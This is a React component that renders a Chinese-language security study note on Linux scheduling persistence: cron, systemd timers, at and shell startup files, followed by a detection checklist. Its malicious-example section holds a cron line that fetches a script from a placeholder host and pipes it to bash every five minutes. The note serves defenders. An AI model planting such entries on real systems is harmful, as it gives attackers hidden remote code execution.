import { Section, Callout, CodeBlock, SimpleTable, RiskCard } from "./_ui";

export default function Scheduling() {
  return (
    <div className="ln-note">
      <header className="ln-header">
        <h1>任務調度（cron & systemd timer）</h1>
        <p className="ln-subtitle">
          決定「程式會不會在你不注意時自動再出現」——最常見的持久化（Persistence）機制。
        </p>
      </header>

      <Callout title="模組定位（一句話）" tone="danger">
        任務調度 = 後門最愛藏的地方（你不看，它就一直活）。
      </Callout>

      <Section title="類型 / 工具 / 管什麼（總覽）">
        <SimpleTable
          headers={["類型", "工具", "管什麼"]}
          rows={[
            ["使用者排程", "crontab", "user 等級自動任務"],
            ["系統排程", "/etc/cron.*", "系統定時任務（root 常見）"],
            ["現代排程", "systemd timer", "事件/時間觸發（更隱蔽）"],
            ["一次性", "at / atq", "單次執行"],
            ["登入觸發", "profile / bashrc", "登入/開 shell 觸發"],
          ]}
        />
      </Section>

      <Section title="cron 核心結構（必背）">
        <CodeBlock
          code={`*  *  *  *  *
│  │  │  │  └─ 星期 (0–7, Sun)
│  │  │  └──── 月 (1–12)
│  │  └────── 日 (1–31)
│  └──────── 小時 (0–23)
└────────── 分鐘 (0–59)`}
        />
      </Section>

      <Section title="使用者 cron（最常見）">
        <CodeBlock
          code={`crontab -e
crontab -l
crontab -r

*/10 * * * * /home/user/backup.sh
@reboot /home/user/start.sh`}
        />
        <Callout title="高風險關鍵字" tone="warn">
          @reboot 常見於持久化（開機自動復活）。
        </Callout>
      </Section>

      <Section title="系統 cron（root 等級）">
        <SimpleTable
          headers={["位置", "說明"]}
          rows={[
            ["/etc/crontab", "系統主表"],
            ["/etc/cron.hourly", "每小時"],
            ["/etc/cron.daily", "每日"],
            ["/etc/cron.weekly", "每週"],
            ["/etc/cron.monthly", "每月"],
          ]}
        />
        <CodeBlock
          code={`cat /etc/crontab
ls /etc/cron.*`}
        />
        <Callout title="資安提醒" tone="danger">
          /etc/cron.* 被寫入 = 系統級持久化（通常需要較高權限）。
        </Callout>
      </Section>

      <Section title="systemd timer（現代做法）">
        <CodeBlock
          code={`# 成對出現：xxx.timer（何時跑） + xxx.service（跑什麼）

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

systemctl list-timers
systemctl status mytimer.timer`}
        />
        <Callout title="重點" tone="warn">
          timer 通常比 cron 更隱蔽、更強大。
        </Callout>
      </Section>

      <Section title="at（一次性排程，常被忽略）">
        <CodeBlock
          code={`at now + 1 hour
atq
atrm <id>`}
        />
      </Section>

      <Section title="非典型排程點（高風險）">
        <SimpleTable
          headers={["位置", "觸發時機"]}
          rows={[
            ["~/.bashrc", "開 shell"],
            ["~/.profile", "登入"],
            ["/etc/profile", "所有人登入"],
            ["~/.ssh/authorized_keys", "SSH 登入"],
            ["systemd user service", "user 登入"],
          ]}
        />
        <Callout title="一句話" tone="danger">
          不在 cron ≠ 沒排程。
        </Callout>
      </Section>

      <Section title="惡意排程範例（理解用）">
        <CodeBlock code={`*/5 * * * * curl http://x.x.x.x/p.sh | bash`} />
        <Callout title="判斷原則" tone="warn">
          名稱合法 ≠ 行為合法；尤其是 curl | bash 這種模式。
        </Callout>
      </Section>

      <Section title="攻擊者視角（風險分級）">
        <RiskCard level="Low" items={["user crontab", "bashrc 後門"]} />
        <RiskCard level="Medium" items={["system cron（需權限）", "systemd user timer"]} />
        <RiskCard level="High" items={["systemd service + timer", "重開機自動復活", "偽裝合法名稱"]} />
      </Section>

      <Section title="偵測與防禦重點（實務清單）">
        <CodeBlock
          code={`crontab -l
sudo crontab -l
systemctl list-timers
ls /etc/cron.*`}
        />
        <ul className="ln-ul">
          <li>最小權限</li>
          <li>auditd</li>
          <li>檔案完整性監控（AIDE）</li>
        </ul>
      </Section>

      <hr className="ln-hr" />
      <footer className="ln-footer">
        <small>Last updated: Scheduling module</small>
      </footer>
    </div>
  );
}
